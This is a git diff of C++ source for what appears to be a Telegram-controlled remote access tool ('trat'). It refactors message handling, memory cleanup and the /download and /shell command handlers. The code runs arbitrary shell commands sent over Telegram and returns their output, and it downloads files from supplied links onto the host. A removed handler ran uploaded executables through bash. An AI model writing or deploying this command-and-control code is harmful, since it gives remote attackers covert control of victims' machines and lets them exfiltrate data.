@@ -1,47 +1,28 @@
 /* trat/src/Bot/handling.cpp */
 
 #include "../../include/bot.hpp"
+#include <cstring>
 
 namespace trat
 {
   bool Bot::checkIfCommand(const char* Message) 
   {
-    if(Message == nullptr)
+    if(!Message) {  return false; }
+
+    char* prefix = parser::getPrefixFromString(Message, ' ');
+    if (!prefix) { return false; }
+    
+    for (size_t i = 0; i < NUMBER_RECOGNIZED_COMMANDS; ++i)
     {
-      return false;
-    }
-    parser::PrefixSuffix *p_prefix_and_suffix = parser::breakDownWord(Message, " ");
-    if (p_prefix_and_suffix == nullptr)
-    {
-      return false;
-    }
-    if (strcmp(p_prefix_and_suffix -> prefix, "") == 0)
-    {
-      if (p_prefix_and_suffix != nullptr)
+      if ( (strcmp(prefix, (this -> commands)[i] )) == 0)
       {
-        parser::PrefixSuffix_destroy(p_prefix_and_suffix);
+        parser::cleanString(prefix);
+        return true;
       }
-      return false;
-    }else
-    {
-      for(auto i = 0 ; i < NUMBER_RECOGNIZED_COMMANDS; ++i)
-      {
-        if ( strcmp(p_prefix_and_suffix -> prefix, (this -> commands)[i]) == 0 )
-        {
-          if (p_prefix_and_suffix != nullptr)
-          {
-            parser::PrefixSuffix_destroy(p_prefix_and_suffix);
-          }
-          return true;
-        }
-      }
-      if (p_prefix_and_suffix != nullptr)
-      {
-        parser::PrefixSuffix_destroy(p_prefix_and_suffix);
-      }
-      return false;
     }
+    return false;
   }
+  
   void Bot::handleTextBasedCommand(const char* Telegram_Message_Text, const char* Command,  char* Shell_Function_Callback_Result)
   {
     if ((Telegram_Message_Text != nullptr)&&(Command != nullptr)&&(Shell_Function_Callback_Result != nullptr))
@@ -51,47 +32,61 @@ namespace trat
         /* Aliasing  the pointer */
         char* function_result = Shell_Function_Callback_Result;
         this->sendMessage(function_result);
-        free(function_result);
-        function_result = nullptr;
+        parser::cleanString(function_result);
       }
     }
   }
   void Bot::handleDownloadCommand(const char* Telegram_Message_Text)
   {
     char* link = parser::checkCommandAndExtractParemeter("/download", Telegram_Message_Text);
-    if (link != nullptr)
+    if(!link)
     {
-      networking::NetworkingResponse networking_response = trat::networking::curlDownload(link, parser::constructFilePath(link));
-      free(link);
-      link = nullptr;
-      char message_buffer[256];
-      if (networking_response.isSuccessful)
-      {
-        snprintf(message_buffer, sizeof(message_buffer), "Download completed in %f",  networking_response.timeInSeconds);   
-      }else
-      {
-        snprintf(message_buffer, sizeof(message_buffer), "DownloadFailed: %s",  networking_response.errorLog);
-      }
-      this->sendMessage(message_buffer);
+      this -> sendMessage("Failed to extract link");
+      return;
     }
-  }
+    if(!(networking::checkLinkValidity(link))) 
+    {
+      this -> sendMessage("Invalid link");
+      return;
+    }
+    char* file_name = parser::getSuffixFromString(link, '/');
+    parser::cleanString(link);
+    char* current_path = parser::copyString(CURRENT_PATH);
+    char* file_path = parser::constructFilePath(current_path, file_name); 
+    parser::cleanString(file_name);
+    parser::cleanString(current_path);
+
+    networking::NetworkingResponse* p_networking_response = trat::networking::curlDownload(link, file_path);
+    parser::cleanString(file_path); 
+    char message_buffer[256];
+    if ( (p_networking_response -> errorLog) == nullptr)
+    {
+      snprintf(message_buffer, sizeof(message_buffer), "Download completed in %f",  p_networking_response -> timeInSeconds);   
+      NetworkingResponseDestroy(p_networking_response);
+    }else
+    {
+      snprintf(message_buffer, sizeof(message_buffer), "DownloadFailed: %s",  p_networking_response -> errorLog);
+      NetworkingResponseDestroy(p_networking_response);
+    }
+    this->sendMessage(message_buffer);
+  } //void Bot::handleDownloadCommand(const char* Telegram_Message_Text)
   void Bot::handleShellCommand(const char* Telegram_Message_Text)
   {
     char* command = parser::checkCommandAndExtractParemeter("/shell", Telegram_Message_Text);
     if(command != nullptr)
     {
-      auto command_result = this -> shell.executeShellCommand(command);
-      free(command);
-      command = nullptr;
-      if(command_result.isSuccessful)
+      ShellResponse *p_command_result = this -> shell.executeShellCommand(command);
+      
+      parser::cleanString(command);
+      if(p_command_result -> isSuccessful)
       {
-        this -> sendMessage(command_result.response);
+        this -> sendMessage(p_command_result -> response);
       }
       else 
       {
         this -> sendMessage("Shell Command failed");
       }
-      ShellResponse_destroy(&command_result); //Weird thing to do, but makes the code paradoxically make sense;
+      ShellResponse_destroy(p_command_result); //Weird thing to do, but makes the code paradoxically make sense;
     }
   }
   void Bot::handleDocuments(telebot_document_t* P_Telebot_Document)
@@ -109,26 +104,5 @@ namespace trat
       }         
     }
     return;
-  }
-  void Bot::handleUploads(telebot_document_t *P_Client_Upload)
-  {
-    if (P_Client_Upload != nullptr)
-    {
-      auto file_id = P_Client_Upload -> file_id;
-      auto file_name = P_Client_Upload -> file_name;
-
-      if ( ( (this -> shell).isExecutable(file_name) ) && (this -> handlingBinaries) )
-      {
-        if (telebot_download_file(this -> handle, file_id, file_name))
-        {
-          std::string execution_command = "bash ./" + std::string(file_name); 
-          this -> handleShellCommand(execution_command.c_str());
-        }
-      }
-      else 
-      {
-        this -> handleDocuments(P_Client_Upload);
-      }
-    }
   }
 }
